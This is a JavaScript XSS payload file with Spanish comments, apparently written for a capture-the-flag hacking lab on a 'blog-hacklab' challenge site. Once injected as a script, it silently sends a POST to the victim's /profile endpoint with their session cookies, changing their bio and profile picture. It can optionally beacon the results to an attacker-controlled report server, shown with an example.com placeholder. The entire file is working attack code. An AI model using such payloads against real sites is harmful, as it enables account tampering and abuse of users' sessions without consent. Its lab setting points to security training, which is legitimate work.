// exploit.js — autoejecutable al cargarse como <script src="..."></script">
(() => {
  'use strict';

  try {
    console.log('✅ exploit.js cargado en', location.href);

    // Opcional: URL objetivo a la que se hará POST
    const TARGET = 'https://chl-0c32c733-85d2-4b07-a3f8-d3e08c82ad62-blog-hacklab-v2.softwareseguro.com.ar/profile';

    // Opcional: si querés que el resultado se reporte a tu servidor, pon la URL aquí.
    // Si no querés reportar, deja null.
    const REPORT_URL = null; // ej: 'https://mi-servidor.example.com/log'

    // Indicador visual mínimo para confirmar ejecución (puede eliminarse)
    (function addMarker(){
      try {
        const marker = document.createElement('div');
        marker.id = 'lab-xss-marker';
        marker.textContent = 'Laboratorio XSS — exploit.js ejecutado';
        Object.assign(marker.style, {
          position: 'fixed',
          bottom: '8px',
          right: '8px',
          background: 'rgba(0,0,0,0.75)',
          color: 'white',
          padding: '6px 10px',
          fontSize: '12px',
          borderRadius: '6px',
          zIndex: 2147483647,
          pointerEvents: 'none',
        });
        document.documentElement.appendChild(marker);
        // auto remover en 8s para no dejar rastro innecesario
        setTimeout(() => marker.remove(), 8000);
      } catch(e) { /* no bloquear si DOM inaccesible */ }
    })();

    // Construir FormData con los campos que tu endpoint espera
    const fd = new FormData();
    // Ajustá los nombres/valores según lo que tu endpoint necesite
    fd.append('bio', 'XSS funciono el xss');
    // Si el endpoint espera un archivo, agrego un Blob vacío como profile_pic
    fd.append('profile_pic', new Blob([''], { type: 'application/octet-stream' }), '');

    // Hacer el POST. NOTA: no seteamos manualmente Content-Type, dejamos que fetch/FormData lo maneje.
    fetch(TARGET, {
      method: 'POST',
      body: fd,
      credentials: 'include' // importante para enviar cookies de sesión si es same-origin
    })
    .then(async response => {
      const text = await response.text().catch(() => '[no body]');
      console.log('✅ POST a target finalizado — status:', response.status, response.statusText);
      console.log('--- cuerpo de respuesta ---\n', text);
      return { status: response.status, statusText: response.statusText, body: text };
    })
    .then(result => {
      // opcional: reportar resultado a tu servidor (si REPORT_URL está definido)
      if (REPORT_URL) {
        try {
          // enviamos solo un resumen; tené en cuenta CORS en REPORT_URL
          navigator.sendBeacon(REPORT_URL, JSON.stringify({
            target: TARGET,
            result
          }));
        } catch(e) {
          // fallback a fetch si beacon falla
          fetch(REPORT_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ target: TARGET, result }),
            keepalive: true
          }).catch(()=>{/* ignore */});
        }
      }
    })
    .catch(err => {
      console.error('❌ Error al hacer POST desde exploit.js:', err);
      // podés intentar reportar el error si REPORT_URL definido (no obligatorio)
      if (REPORT_URL) {
        try {
          navigator.sendBeacon(REPORT_URL, JSON.stringify({
            target: TARGET,
            error: String(err)
          }));
        } catch(e){/* ignore */}
      }
    });

  } catch (outerErr) {
    console.error('❌ Error ejecutando exploit.js:', outerErr);
  }
})();
